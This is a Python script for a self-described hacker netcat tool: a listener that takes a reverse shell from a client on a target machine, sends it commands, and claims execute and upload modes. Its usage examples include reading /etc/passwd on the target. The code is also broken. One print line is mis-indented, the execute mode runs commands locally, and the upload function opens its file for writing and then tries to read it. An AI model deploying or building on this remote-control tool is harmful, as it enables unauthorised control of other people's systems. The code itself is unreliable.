#!/usr/bin/python3.7
import sys
import socket
import getopt
import threading
import subprocess
import os

# global variables
host = ''
port = 0
main_loop = True
second_loop = True
arg = sys.argv

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def usage():
    print("Hackerfromscratch MiniNetcat Tool \n")
    print("usage hfsnet.py -t target -p port")
    print("-c --command - listen to client.py for a reverse shell")
    print("-e --execute=file_to_run - listen to client.py and execute file on the target machine")
    print("-u --upload=destination listen to client.py and upload a file to the target machine")
    print("""examples of use as follows:
            hfsnet.py -t 192.168.0.2 -p 6065 -c
            hfsnet.py -t 192.168.0.2 -p 6065 -e cat /etc/passwd
            hfsnet.py -t 192.168.0.2 -p 6065 -u c:\\target.exe
            """)
   print("last option don't work sorry or you can help me in it if you feel like, i will fix it when i have somes times...")

def reverse_shell(): # function to get a reverse shell from the client
    global main_loop, second_loop
    cmd = input("<target:#> ")
    if cmd == "end":
        main_loop = False
        second_loop = False
        conn.send(b"end")
    else:
        conn.sendall(cmd.encode())
        output = conn.recv(2048).decode()
        print(output)


def execute(): # a simple function for executing command
    global cmd 
    os.system(cmd)
    print()


def closing_for_error(error): # a functions for error handling and closing so we don't have repeted code
    global main_loop, second_loop
    if error == 1 :
        print("error in syntax please see usage")
        print('closing the netcat...')
        main_loop = False
    else :
        print("target had disconected")
        print('closing the netcat...')
        second_loop = False
        main_loop = False


def upload_file(file_to_send): # uploding file not working for now 
    with open(file_to_send, 'wb') as file:
        file = file.read()
        print(file)
        conn.send(file.encode())


while main_loop: # the main loop 
    if not len(sys.argv[1:]): # check if the script is lanched without argument
        usage()
        main_loop = False 
    else: # if no we check them 
        try:
            if arg[1] == "-t" and arg[3] == "-p": # getting target ip and port
                try:
                    host = str(arg[2])
                    port = int(arg[4])
                    server.bind((host, port))
                    server.listen(5)
                    if arg[5] == '-c' or arg[5] == "--command":
                        print("waiting for a target...")
                        conn, addr = server.accept()
                        temp_var = arg[5]
                        conn.send(temp_var.encode())
                        print("target online getting a revese shell...")
                        while second_loop:
                            try:
                                reverse_shell()
                            except ConnectionAbortedError:
                                closing_for_error(0)
                            except ConnectionResetError:
                                closing_for_error(0)
                            except BrokenPipeError:
                                closing_for_error(0)
                    elif arg[5] == '-e' or arg[5] == "--execute":
                        print("waiting for the target to connect...")
                        conn, addr = server.accept()
                        temp_var = arg[5]
                        conn.send(temp_var.encode())
                        print("target online executing the script...")
                        opts, args = getopt.getopt(sys.argv[6:] ,(''))
                        cmd = ' '.join(args)
                        print(cmd)
                        execute()
                        main_loop = False
                    elif arg[5] == '-u' or arg[5] == "--upload":
                        print("waiting for the target to connect...")
                        conn, addr = server.accept()
                        opts, args = getopt.getopt(sys.argv[6:] ,(''))
                        the_file = ''.join(args)
                        conn.send(the_file.encode())
                        upload_file(the_file)
                        main_loop = False

                except IndexError:
                    closing_for_error(1)
                except OSError :
                    closing_for_error(1)
            else:
                usage()
        except IndexError:
            closing_for_error(1)
      

    

server.close()
